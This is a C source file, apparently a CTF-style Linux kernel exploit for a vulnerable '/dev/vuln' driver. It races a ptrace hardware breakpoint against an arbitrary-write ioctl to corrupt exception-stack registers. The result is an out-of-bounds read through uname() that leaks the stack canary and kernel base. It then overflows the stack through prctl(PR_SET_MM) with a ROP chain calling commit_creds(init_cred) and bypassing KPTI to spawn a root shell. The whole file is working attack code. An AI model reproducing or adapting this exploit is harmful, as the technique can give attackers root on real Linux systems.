#include "inc/common.h"
#include "inc/snippet.h"

// #include <sys/sem.h>
// #include <sys/ipc.h>
// #include <sys/shm.h>
// #include <semaphore.h>
// #include <sys/xattr.h>
// #include <asm/ldt.h>
// #include <sys/wait.h>
// #include <sys/socket.h>

// #include <malloc.h>
// #include <sys/types.h>
// #include <sys/ipc.h>
// #include <sys/msg.h>
#include <stddef.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/utsname.h>
#include <sys/types.h>
#include <sys/wait.h>

#define ADDR cRED "0x%lx" cRST
#define HWBP_ADDR ((void *)07210000)
#define HWBP_SIZE 0x1000
#define addr(var) ok(#var " at " ADDR, var)

u64 kbase, kdma, canary;
const char *devname = "/dev/vuln";
pid_t victim_pid, trigger_pid;

#define init_cred    (kbase + 0x1c8aa20)
#define bypass_kpti  (kbase + 0x0e010b0 + 54)
#define pop_rdi      (kbase + 0x0d37ba6)
#define commit_creds (kbase + 0x00ec4e0)

void hexdump(const void *data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        dprintf(2, "%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' &&
            ((unsigned char *)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char *)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size) {
            dprintf(2, " ");
            if ((i + 1) % 16 == 0) {
                dprintf(2, "|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    dprintf(2, " ");
                }
                for (j = (i + 1) % 16; j < 16; ++j) {
                    dprintf(2, "   ");
                }
                dprintf(2, "|  %s \n", ascii);
            }
        }
    }
}

/* must be call after child process set TRACEME */
void create_hwbp(u64 addr) {

  #define PTRACE_DR(idx, data) ({ \
    if(ptrace(PTRACE_POKEUSER, victim_pid, offsetof(struct user, u_debugreg[idx]), data) == -1) \
        panic("ptrace dr" #idx); \
  })

    PTRACE_DR(0, addr);
    /* Set DR7: bit 0 enables DR0 breakpoint. Bit 8 ensures the processor stops
     * on the instruction which causes the exception. bits 16,17 means we stop
     * on data read or write. */
    dbg("%d", (int)sizeof(unsigned long));
    u64 dr7 = (1 << 0) | (1 << 8) | (1 << 16) | (1 << 17);
    PTRACE_DR(7, dr7);
}

void bind_cpu(int cpu_nr) {
    cpu_set_t cset;
    CPU_ZERO(&cset);
    CPU_SET(cpu_nr, &cset);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cset))
        panic("sched_setaffinity: %d", cpu_nr);
}

typedef struct {
    u64 addr;
    u64 val;
}Req;

void aaw(u64 addr, u64 val) {
    Req r = { .addr = addr, .val = val };
    if(ioctl(devfd, 0, &r) < 0)
        panic("aaw");
}
/*
    break at exc_debug_kernel to get it
    (gdb) p/x &regs->cx
    $3 = 0xfffffe0000010fb0
*/
#define CPU0_rcx_location (0xfffffe0000010fb0)

void trigger_run() {
    act("T> start to aaw cx reg in estack...");
    bind_cpu(1);
    while(1) {
        /* bcoz the granularity copt_to_user in string is 8 bytes */
        aaw(CPU0_rcx_location, 0x400 / 8);/* hijack cx to 0x100 for overread 0x400 */
    }
}
enum Step {
    STEP_OOR = 0,
    STEP_STACK_OVERFLOW,
};


u64 _ip = (u64)get_root_shell;

void victim_run() {

    act("V> start to invoke uname and prctl ...");

    enum Step step = STEP_OOR;
    u8 *utsname_buf = (u8 *)HWBP_ADDR;
    memset((u8 *)HWBP_ADDR, '\x00', HWBP_SIZE);
    bind_cpu(0);

    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) != 0)
        panic("PTRACE_TRACEME");

    while (1) {

        raise(SIGSTOP);
        
        switch(step) {
            case STEP_OOR : 
                {
                    uname((struct utsname *)utsname_buf);
                    u8 *leaked = utsname_buf + sizeof(struct utsname);
                    range(i, 0x20, {
                        if(leaked[i]) {
                            ok("V> oor successful");
                            hexdump((u8 *)HWBP_ADDR + sizeof(struct utsname), 0x100);
                            
                            u64 *leaked = (u64 *)((u8 *)HWBP_ADDR + sizeof(struct utsname));

                            canary = leaked[0];
                            addr(canary);
                            
                            kbase  = leaked[4] - 0xd48b2;
                            addr(kbase);

                            step++;
                            break;
                        }
                    });
                }
                break;
            case STEP_STACK_OVERFLOW :
                {
                    #define PADDING_CNT 0x44 /* todo */ 
                    #define CANARY_IDX  0x3d /* todo */
                    // #define ROP_CNT     ???

                    // u64 rop[PADDING_CNT + ROP_CNT];
                    u64 i = 0;
                    u64 *rop = (u64 *)HWBP_ADDR;
                    rop[CANARY_IDX]        = canary;

                    rop[PADDING_CNT + i++] = pop_rdi;
                    rop[PADDING_CNT + i++] = init_cred;
                    rop[PADDING_CNT + i++] = commit_creds;
                    rop[PADDING_CNT + i++] = bypass_kpti;
                    rop[PADDING_CNT + i++] = 0x0d000721;
                    rop[PADDING_CNT + i++] = 0x0d000721;
                    rop[PADDING_CNT + i++] = _ip;
                    rop[PADDING_CNT + i++] = _cs;
                    rop[PADDING_CNT + i++] = _rflags;
                    rop[PADDING_CNT + i++] = _sp;
                    rop[PADDING_CNT + i++] = _ss;

                    // assert(i < ROP_CNT);/* sanity check */
                    act("V> try to use prctl(PR_SET_MM...) to overflow the stack...");
                    
                    prctl(
                        PR_SET_MM, 
                        PR_SET_MM_MAP, 
                        HWBP_ADDR,
                        sizeof(struct prctl_mm_map), 
                        0
                    );
                }
                break;
            default:
                unreachable();
        }
    }
}


#define fork_switch(name) ({                   \
    switch (name##_pid = fork()) {             \
        case -1: panic("fork victim");         \
        case 0:                                \
            name##_run();                      \
            exit(0);                           \
            break;                             \
        default:                               \
            break;                             \
    }                                          \
})

int main()
{
    save_state();
    open_dev(devname, O_RDONLY);

    if(mmap(
        HWBP_ADDR,
        HWBP_SIZE,
        PROT_READ  | PROT_WRITE,
        MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED,
        -1,
        0
    ) == MAP_FAILED) panic("mmap");

    act("fork victim child ...");
    fork_switch(victim);
    waitpid(victim_pid, NULL, __WALL);/* TODO */

    act("fork trigger child ...");
    fork_switch(trigger);

    act("try to create hardware breakpoint...");
    create_hwbp((u64)HWBP_ADDR);

    while(1) {

        if(ptrace(PTRACE_CONT, victim_pid, NULL, NULL) == -1)
            panic("ptrace continue");
            
        waitpid(victim_pid, NULL, __WALL);/* TODO */
        
    }
    
    return 0;
}
